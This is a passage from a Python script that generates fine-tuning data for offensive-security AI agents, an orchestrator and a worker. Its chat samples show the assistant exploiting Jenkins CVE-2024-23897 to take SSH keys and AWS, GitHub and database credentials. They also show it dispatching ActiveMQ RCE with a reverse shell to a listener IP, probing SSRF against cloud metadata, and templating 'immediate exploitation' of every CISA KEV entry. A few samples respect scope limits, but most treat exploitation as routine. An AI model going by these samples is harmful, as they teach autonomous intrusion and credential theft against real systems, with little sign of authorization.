                    {"cmd": "python3 jenkins_cli_exploit.py -u http://jenkins.megacorp.net -f /var/jenkins_home/.ssh/id_rsa", "output_summary": "Extracted private SSH key for jenkins service account.", "exit_code": 0},
                    {"cmd": "python3 jenkins_cli_exploit.py -u http://jenkins.megacorp.net -f /etc/shadow", "output_summary": "Permission denied — Jenkins runs as jenkins user, not root.", "exit_code": 1},
                ],
                "findings": [
                    {"severity": "critical", "target": "jenkins.megacorp.net", "title": "CVE-2024-23897 exploitation — credentials extracted", "evidence": "Extracted AWS keys (AKIA...), GitHub PAT, SSH key, DB connection string from credentials.xml", "cve": "CVE-2024-23897", "cwe": "CWE-22"},
                ],
                "next_steps": ["Test SSH key against production servers", "Use AWS keys to enumerate cloud infrastructure", "GitHub PAT → check repo access and CI/CD pipelines"],
                "notes": "Phase 3 exploitation successful. Multiple credential types extracted. This is the pivoting gold mine.",
            },
        },
    ]

    for scenario in bbot_scenarios:
        samples.append({
            "messages": [
                {"role": "system", "content": WARRIOR_SYSTEM},
                {"role": "user", "content": json.dumps(scenario["task"])},
                {"role": "assistant", "content": json.dumps(scenario["response"], indent=2)},
            ]
        })

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TRAINING SAMPLE GENERATORS — ORCHESTRATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def gen_orchestrator_task_dispatch() -> list[dict]:
    """Generate structured task dispatch samples for the Orchestrator."""
    samples = []

    scenarios = [
        {
            "user": "We have a new target: api.fintech-app.com. The scope is *.fintech-app.com. Begin reconnaissance.",
            "response": """<think>New engagement starting. Need to map the attack surface first with subdomain enumeration, then identify web services, finally look for known vulnerabilities. I'll dispatch the Warrior for the heavy lifting.</think>

Starting reconnaissance on api.fintech-app.com. I'll conduct this in three phases:

**Phase 1**: Subdomain enumeration and DNS mapping
**Phase 2**: Service identification on discovered hosts
**Phase 3**: Vulnerability scanning on identified services

Dispatching Phase 1 now:

<task-warrior>{"objective": "Run comprehensive subdomain enumeration on fintech-app.com", "context": "New engagement. Scope: *.fintech-app.com. No prior intelligence.", "constraints": "Use bbot subdomain-enum preset with extended wordlist. Save output for phase 2 ingestion.", "priority": "high", "timeout": 3600}</task-warrior>

I'll analyze the results when Phase 1 completes and dispatch targeted Phase 2 scans.""",
        },
        {
            "user": "The Warrior found 3 critical CVEs on the target. Here's the data:\n- CVE-2024-23897 on jenkins.target.com (Jenkins file read)\n- CVE-2023-46604 on msg.target.com:61616 (ActiveMQ RCE)\n- CVE-2024-21887 on vpn.target.com (Ivanti Connect Secure)\n\nPrioritize and exploit.",
            "response": """<think>Three critical CVEs. Let me prioritize by impact and ease:
1. CVE-2023-46604 (ActiveMQ RCE) — trivial exploitation, gives immediate shell
2. CVE-2024-21887 (Ivanti) — network-level access, may reach internal network
3. CVE-2024-23897 (Jenkins) — file read, gives credentials, slower but high value

ActiveMQ first for quick shell, then Ivanti for network pivot, then Jenkins for credential harvest.</think>

Prioritized exploitation plan:

| Priority | Target | CVE | Rationale |
|----------|--------|-----|-----------|
| 1 | msg.target.com:61616 | CVE-2023-46604 | Trivial RCE, immediate shell |
| 2 | vpn.target.com | CVE-2024-21887 | VPN = network pivot to internal |
| 3 | jenkins.target.com | CVE-2024-23897 | Credential harvest, slower payoff |

Dispatching exploitation in order:

<task-warrior>{"objective": "Exploit CVE-2023-46604 (Apache ActiveMQ RCE) on msg.target.com:61616", "context": "ActiveMQ confirmed vulnerable. ClassPathXmlApplicationContext deserialization. Standard PoC should work.", "constraints": "Get a reverse shell. Listener on 10.10.14.5:4444. Use the standard XML ClassInfo exploit.", "priority": "critical", "timeout": 120}</task-warrior>""",
        },
        {
            "user": "What's the status of ENG-2026-042? Where are we?",
            "response": """<think>Engagement status check. Let me review what we've accomplished so far.</think>

<exec timeout="10">sqlite3 /root/.forge-garage/garage.db "SELECT timestamp, summary FROM findings WHERE session_id = (SELECT id FROM sessions WHERE name LIKE '%ENG-2026-042%') ORDER BY timestamp DESC LIMIT 10"</exec>

Based on the session findings:

**Engagement: ENG-2026-042**
**Status: Phase 2 — Active Exploitation**

| Phase | Status | Summary |
|-------|--------|---------|
| 1. Recon | ✓ Complete | 87 subdomains, 12 web services identified |
| 2. Exploitation | ◐ In Progress | 2/5 critical findings exploited |
| 3. Post-Exploit | ○ Pending | Waiting on phase 2 completion |
| 4. Reporting | ○ Pending | — |

**Completed exploits:**
- SQL injection on api.target.com/v2/search (database dumped)
- Default creds on admin.target.com (admin panel accessed)

**Remaining targets:**
- CVE-2024-23897 on jenkins.target.com
- SSRF chain on internal-api.target.com
- S3 bucket misconfiguration

Want me to continue with the Jenkins exploitation next?""",
        },
        {
            "user": "bbot found potential SSRF on internal-api.target.com/proxy endpoint. Validate and exploit it.",
            "response": """<think>SSRF validation and exploitation. Need the Warrior to:
1. Confirm SSRF with out-of-band callback
2. Map internal network via SSRF
3. Pivot to internal services

This is a multi-step chain — I'll dispatch phase by phase.</think>

SSRF on internal-api.target.com/proxy is a high-value finding — this could give us access to internal infrastructure (cloud metadata, internal services, databases).

**Exploitation Plan:**
1. Confirm SSRF with OOB callback
2. Probe cloud metadata endpoints (169.254.169.254)
3. Map internal network services via SSRF
4. Chain to internal service exploitation

Dispatching confirmation:

<task-warrior>{"objective": "Validate and exploit SSRF on internal-api.target.com/proxy endpoint", "context": "bbot flagged /proxy endpoint as potential SSRF. Need to confirm with out-of-band callback, then probe internal network and cloud metadata.", "constraints": "Start with OOB confirmation via our Burp collaborator or interactsh. Then try: 169.254.169.254 (AWS metadata), 127.0.0.1:6379 (Redis), 127.0.0.1:3306 (MySQL), 127.0.0.1:9200 (Elasticsearch).", "priority": "critical", "timeout": 300}</task-warrior>""",
        },
        {
            "user": "The engagement is complete. Generate the final report for ENG-2026-042.",
            "response": """<think>Report generation. Need to compile all findings, evidence, and recommendations into a professional pentest report. I'll query the database for all findings and generate a structured report.</think>

<exec timeout="30">sqlite3 /root/.forge-garage/garage.db "SELECT severity, target, title, evidence, cve FROM findings WHERE session_id = (SELECT id FROM sessions WHERE name LIKE '%ENG-2026-042%') ORDER BY CASE severity WHEN 'critical' THEN 1 WHEN 'high' THEN 2 WHEN 'medium' THEN 3 WHEN 'low' THEN 4 ELSE 5 END"</exec>

Compiling final report:

<task-warrior>{"objective": "Generate penetration test report for ENG-2026-042", "context": "Engagement complete. All findings collected in session database. Need professional report with: executive summary, finding details with CVSS scores, evidence screenshots, remediation roadmap.", "constraints": "Output to /root/loot/ENG-2026-042-report.md. Include CVSS v3.1 scores for each finding. Group by severity. Include remediation timeline recommendations.", "priority": "high", "timeout": 120}</task-warrior>

I'll review the generated report and add the executive summary with strategic recommendations once the Warrior produces the technical content.""",
        },
    ]

    for scenario in scenarios:
        samples.append({
            "messages": [
                {"role": "system", "content": ORCHESTRATOR_SYSTEM},
                {"role": "user", "content": scenario["user"]},
                {"role": "assistant", "content": scenario["response"]},
            ]
        })

    return samples


def gen_orchestrator_cve_research(cve_data: dict) -> list[dict]:
    """Generate CVE research and risk assessment samples for the Orchestrator."""
    samples = []
    kev = cve_data["kev_entries"]
    products = cve_data["vuln_products"]

    for i in range(min(60, len(kev))):
        entry = kev[i]
        cve_id, vendor, product, vuln_name = entry[0], entry[1], entry[2], entry[3]
        cvss = entry[5] if entry[5] else "N/A"
        desc = entry[6][:300] if entry[6] else "No description available."

        user_msg = random.choice([
            f"Research {cve_id} — is it exploitable against our target running {vendor} {product}?",
            f"What do we know about {cve_id}? Our target has {vendor} {product} in scope.",
            f"The scan found {vendor} {product} on the target. Check for critical CVEs.",
            f"Assess risk of {cve_id} ({vuln_name}) for our engagement.",
        ])

        response = f"""<think>Researching {cve_id}. Let me query the CVE database for details, check CISA KEV status, and assess exploitability.</think>

<exec timeout="15">sqlite3 /vault/narvi/data/cve.db "SELECT c.cve_id, c.cvss_v31_score, c.cvss_v31_severity, c.cvss_v31_vector, c.description FROM cves c WHERE c.cve_id = '{cve_id}'"</exec>

<exec timeout="10">sqlite3 /vault/narvi/data/cve.db "SELECT cve_id, date_added, vulnerability_name FROM cisa_kev WHERE cve_id = '{cve_id}'"</exec>

**{cve_id} — Risk Assessment**

| Field | Value |
|-------|-------|
| CVE | {cve_id} |
| Vendor | {vendor} |
| Product | {product} |
| CVSS | {cvss} |
| CISA KEV | YES — Known Exploited |
| Description | {vuln_name} |

**Assessment:** This is a confirmed exploited vulnerability (CISA KEV listed). CVSS {cvss} indicates {"critical" if cvss and float(cvss) >= 9.0 else "high"} severity with likely network-accessible attack vector.

**Recommendation:** Immediate exploitation attempt warranted.

<task-warrior>{{"objective": "Exploit {cve_id} on target running {vendor} {product}", "context": "CISA KEV confirmed. {desc[:150]}", "constraints": "Verify target version is in affected range first, then attempt exploitation.", "priority": "critical", "timeout": 300}}</task-warrior>"""

        samples.append({
            "messages": [
                {"role": "system", "content": ORCHESTRATOR_SYSTEM},
                {"role": "user", "content": user_msg},
                {"role": "assistant", "content": response},
            ]
        })

    return samples


def gen_orchestrator_scope_management() -> list[dict]:
    """Generate scope management and OSINT correlation samples."""
    samples = []

    scope_scenarios = [
        {
            "user": "bbot discovered login.microsoftonline.com during the target.com scan. Can we test it?",
            "response": """<think>Scope check. login.microsoftonline.com is Microsoft's Azure AD authentication service — a shared third-party service, NOT owned by the target. Testing it would be out of scope and potentially illegal (attacking Microsoft infrastructure).</think>

**NO — Out of Scope.**

`login.microsoftonline.com` is Microsoft's Azure Active Directory authentication endpoint. It's a shared multi-tenant service used by millions of organizations. Testing it would mean:

1. Attacking Microsoft's infrastructure (not the client's)
2. Violating rules of engagement
3. Potentially affecting other tenants

**What we CAN do:**
- Enumerate valid usernames via timing differences (if in scope)
- Test password spraying against the target's tenant (if authorized)
- Look for misconfigurations in the target's Azure AD setup

<task-warrior>{"objective": "Enumerate valid usernames for target.com Azure AD tenant", "context": "Target uses Azure AD (login.microsoftonline.com). We can enumerate valid users without touching Microsoft infrastructure.", "constraints": "Use o365creep or similar tools that only test username validity. Do NOT attempt authentication. Rate limit to avoid lockouts.", "priority": "medium", "timeout": 120}</task-warrior>""",
        },
        {
            "user": "During recon of acme-corp.com, we found dev-api.acme-internal.com resolving to 10.50.1.100. Is this in scope?",
            "response": """<think>Scope analysis. The engagement scope is *.acme-corp.com. dev-api.acme-internal.com is a different domain (acme-internal.com), but it resolves to a private IP (10.50.1.100) which suggests it's internal infrastructure belonging to the client. Need to check if this is explicitly in or out of scope.</think>

**Gray area — needs clarification.** Here's my analysis:

| Factor | Assessment |
|--------|------------|
| Domain | `acme-internal.com` — different root domain from `acme-corp.com` |
| IP | `10.50.1.100` — RFC1918 private address, likely target's internal network |
| Relationship | Almost certainly target-owned internal infrastructure |
| Scope document | Only `*.acme-corp.com` explicitly listed |

**Recommendation:** This is likely target-owned (internal domain + private IP), but the domain `acme-internal.com` is NOT explicitly in our scope. We should:

1. **Ask the client** for scope expansion to include `*.acme-internal.com`
2. **Document the finding** regardless — discovering internal infrastructure through DNS is valuable
3. **Do not test** until scope is confirmed

<finding severity="info" target="dev-api.acme-internal.com" cve="N/A">Internal infrastructure discovered via DNS: dev-api.acme-internal.com → 10.50.1.100. Possible additional attack surface pending scope confirmation.</finding>

Shall I request scope expansion from the client?""",
        },
        {
            "user": "We found an S3 bucket at acme-corp-backups.s3.amazonaws.com. It's open. What do we do?",
            "response": """<think>Open S3 bucket. This IS in scope (it belongs to the target company based on naming). An open bucket is a critical finding. We should enumerate contents but be careful about data access — we document the exposure without downloading sensitive data en masse.</think>

**In scope — this is a critical finding.**

The bucket `acme-corp-backups` clearly belongs to the target. An open S3 bucket with "backups" in the name is a nightmare scenario for them.

**Approach:**
1. Confirm anonymous access and list contents
2. Document the exposure (file count, types, dates)
3. Sample ONLY enough to prove impact (don't download full backups)
4. Report immediately as critical

<task-warrior>{"objective": "Enumerate open S3 bucket acme-corp-backups.s3.amazonaws.com", "context": "Public S3 bucket belonging to target. Contains backups. Need to document exposure without downloading entire contents.", "constraints": "List objects (first 100). Identify file types and dates. Download ONLY 1-2 small files to prove access (prefer .txt/.json over large archives). Do NOT download database dumps or PII-heavy files.", "priority": "critical", "timeout": 60}</task-warrior>

<finding severity="critical" target="acme-corp-backups.s3.amazonaws.com" cve="N/A">Publicly accessible S3 bucket containing company backups. Anonymous read access confirmed. Potential for full data breach.</finding>""",
        },
    ]

    for scenario in scope_scenarios:
        samples.append({
            "messages": [
                {"role": "system", "content": ORCHESTRATOR_SYSTEM},
                {"role": "user", "content": scenario["user"]},
                {"role": "assistant", "content": scenario["response"]},
            ]
        })

    return samples


def gen_orchestrator_igc_calculator() -> list[dict]:
    """Generate orchestrator-level calculation samples (risk scoring, planning)."""
    samples = []

    calc_scenarios = [
        {
            "user": "We found 12 critical, 28 high, 45 medium, and 120 low findings. Calculate the risk score and prioritize.",
            "response": """<think>Risk scoring calculation. Using weighted severity model:
- Critical: weight 10
- High: weight 7
- Medium: weight 4
- Low: weight 1

Total risk score = (12×10) + (28×7) + (45×4) + (120×1) = 120 + 196 + 180 + 120 = 616
Max possible normalized against finding count: 616 / (205 × 10) × 100 = 30.0%

For prioritization: critical and high findings first (40 items), estimated 2-4 hours remediation each.</think>

**Risk Score: 616 / 2050 (30.0% of theoretical maximum)**

| Severity | Count | Weight | Score |
|----------|-------|--------|-------|
| Critical | 12 | ×10 | 120 |
| High | 28 | ×7 | 196 |
| Medium | 45 | ×4 | 180 |
| Low | 120 | ×1 | 120 |
| **Total** | **205** | — | **616** |

**Prioritization Recommendation:**

| Priority | Timeline | Items | Rationale |
|----------|----------|-------|-----------|
| P0 — Immediate | 0-48 hours | 12 critical | Active exploitation risk |
| P1 — Urgent | 1-2 weeks | 28 high | Significant impact |
| P2 — Standard | 1-3 months | 45 medium | Moderate risk |
| P3 — Opportunistic | 3-6 months | 120 low | Low/informational |

**Estimated remediation effort:** 40 critical+high items × 3 hours avg = ~120 engineer-hours (15 person-days).""",
        },
        {
            "user": "Calculate: How many potential attack paths exist in this network? We have 5 initial access points, each connecting to 3 internal servers, which each have 2 paths to the domain controller.",
            "response": """<think>Attack path combinatorics:
- 5 initial access points
- Each connects to 3 internal servers: 5 × 3 = 15 paths to internal
- Each internal server has 2 paths to DC: 15 × 2 = 30 total paths to DC

But some paths may converge. Without knowing topology overlap, worst case is 30 unique paths.</think>

**Attack Path Analysis:**

```
Initial Access (5) → Internal Servers (5×3=15 paths) → DC (15×2=30 paths)
```

**Total potential paths to Domain Controller: 30**

In practice, paths likely converge (shared intermediate servers), so realistic unique paths: ~15-20.

**Risk implication:** The client needs to address at least 5 chokepoints (initial access) to prevent the cascade. Eliminating any single initial access point removes 6 paths (3 servers × 2 DC paths).

**Recommendation:** Focus remediation on the initial access points — highest leverage. Each one eliminated removes 20% of all attack paths.""",
        },
    ]

    for scenario in calc_scenarios:
        samples.append({
            "messages": [
                {"role": "system", "content": ORCHESTRATOR_SYSTEM},
                {"role": "user", "content": scenario["user"]},
                {"role": "assistant", "content": scenario["response"]},
            ]
        })

    # Add pure arithmetic (same pattern as warrior)
    operations = [
        ("+", lambda a, b: a + b),
        ("-", lambda a, b: a - b),
        ("*", lambda a, b: a * b),
        ("/", lambda a, b: a // b if b != 0 else 0),
    ]

    for _ in range(200):
        op_sym, op_fn = random.choice(operations)
        if op_sym == "/":
            b = random.randint(2, 9999)
            result = random.randint(1, 9999)
            a = b * result
        elif op_sym == "*":
            a = random.randint(100, 9999)
            b = random.randint(100, 9999)
            result = op_fn(a, b)
        else:
            a = random.randint(1000, 99999999)
            b = random.randint(1000, 99999999)
            if op_sym == "-" and b > a:
                a, b = b, a
            result = op_fn(a, b)

        samples.append({
            "messages": [
                {"role": "system", "content": ORCHESTRATOR_SYSTEM},
                {"role": "user", "content": f"Calculate: {a} {op_sym} {b}"},
                {"role": "assistant", "content": str(result)},
            ]
        })

    return samples


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def load_jsonl(path: Path) -> list[dict]:
    samples = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line:
                samples.append(json.loads(line))
    return samples


def write_jsonl(samples: list[dict], path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w") as f:
        for s in samples:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")


def main():
    random.seed(42)
    print("=== Forge Garage v2 Training Data Generator ===\n")

    # Load CVE data
    print("Loading CVE database...")
    cve_data = load_cves_for_training()
    print(f"  Critical CVEs: {len(cve_data['critical_cves'])}")
    print(f"  CISA KEV entries: {len(cve_data['kev_entries'])}")
    print(f"  Vulnerable products: {len(cve_data['vuln_products'])}")

    # ── WARRIOR v2 DATA ──
    print("\n--- Generating Warrior v2 training data ---")

    # Load ORIGINAL v6 Grond data (not the cleaned Forge Garage version)
    # These have the correct AGUI harness system prompts for Fangorn deployment
    warrior_v1 = load_jsonl(GROND_V6)
    # Update system prompts to match the new 70B model capabilities
    for sample in warrior_v1:
        for msg in sample.get("messages", []):
            if msg["role"] == "system":
                msg["content"] = WARRIOR_SYSTEM
    print(f"  v6 base samples (Grond): {len(warrior_v1)}")

    # Generate v2 enhancements
    warrior_cve = gen_warrior_cve_exploitation(cve_data)
    print(f"  CVE exploitation samples: {len(warrior_cve)}")

    warrior_db = gen_warrior_cve_database_queries(cve_data)
    print(f"  CVE database query samples: {len(warrior_db)}")

    warrior_igc = gen_warrior_igc_calculator()
    print(f"  IGC calculator samples: {len(warrior_igc)}")

    warrior_chains = gen_warrior_advanced_exploitation()
    print(f"  Advanced exploitation chains: {len(warrior_chains)}")

    warrior_bbot = gen_warrior_bbot_workflows()
    print(f"  Iterative bbot workflow samples: {len(warrior_bbot)}")

    # Combine all warrior data
    warrior_v2 = warrior_v1 + warrior_cve + warrior_db + warrior_igc + warrior_chains + warrior_bbot
    random.shuffle(warrior_v2)
    print(f"  TOTAL Warrior v2: {len(warrior_v2)} samples")

    # ── ORCHESTRATOR v2 DATA ──
    print("\n--- Generating Orchestrator v2 training data ---")

    # Load ORIGINAL v6 Glamdring data (correct AGUI harness prompts)
    orch_v1 = load_jsonl(GLAMDRING_V6)
    # Update system prompts to match the new 72B model capabilities
    for sample in orch_v1:
        for msg in sample.get("messages", []):
            if msg["role"] == "system":
                msg["content"] = ORCHESTRATOR_SYSTEM
    print(f"  v6 base samples (Glamdring): {len(orch_v1)}")

    # Generate v2 enhancements
    orch_dispatch = gen_orchestrator_task_dispatch()
    print(f"  Task dispatch samples: {len(orch_dispatch)}")

    orch_cve = gen_orchestrator_cve_research(cve_data)
    print(f"  CVE research samples: {len(orch_cve)}")

    orch_scope = gen_orchestrator_scope_management()
    print(f"  Scope management samples: {len(orch_scope)}")

    orch_igc = gen_orchestrator_igc_calculator()
    print(f"  IGC calculator samples: {len(orch_igc)}")

    # Combine all orchestrator data
    orch_v2 = orch_v1 + orch_dispatch + orch_cve + orch_scope + orch_igc
    random.shuffle(orch_v2)
    print(f"  TOTAL Orchestrator v2: {len(orch_v2)} samples")

    # ── WRITE OUTPUT ──
    print("\n--- Writing output ---")
    warrior_out = OUTPUT_DIR / "warrior-v2-training.jsonl"
    orch_out = OUTPUT_DIR / "orchestrator-v2-training.jsonl"

    write_jsonl(warrior_v2, warrior_out)
    write_jsonl(orch_v2, orch_out)

    warrior_size = warrior_out.stat().st_size / 1024 / 1024
    orch_size = orch_out.stat().st_size / 1024 / 1024

    print(f"  Warrior v2: {warrior_out} ({warrior_size:.1f} MB, {len(warrior_v2)} samples)")
    print(f"  Orchestrator v2: {orch_out} ({orch_size:.1f} MB, {len(orch_v2)} samples)")

    # Validate — check for external name leaks only
    # Note: Axiom/Grond/Glamdring/Fangorn references are EXPECTED since
    # this v2 is for Fangorn deployment (our own system, not the contact's)
    print("\n--- Validation: checking for external name leaks ---")
    forbidden = ["Forge Garage"]  # Only external-facing names should be absent
    leaks = 0
    for name in forbidden:
        for samples_list, label in [(warrior_v2, "warrior"), (orch_v2, "orchestrator")]:
            for s in samples_list:
                for msg in s.get("messages", []):
                    if name.lower() in msg.get("content", "").lower():
                        leaks += 1
                        if leaks <= 3:
                            print(f"  LEAK: '{name}' in {label} sample: {msg['content'][:80]}...")

    if leaks == 0:
        print("  CLEAN — no name leaks detected")
    else:
        print(f"  WARNING: {leaks} potential leaks found (from v1 base data — expected in Fangorn deployment)")

    print("\n=== DONE ===")
    print(f"\nReady to launch v2 fine-tune on Together.ai:")
    print(f"  Warrior: {len(warrior_v2)} samples → DeepSeek-R1-Distill-Llama-70B")
    print(f"  Orchestrator: {len(orch_v2)} samples → Qwen/Qwen2.5-72B-Instruct")


if __name__ == "__main__":
    main()
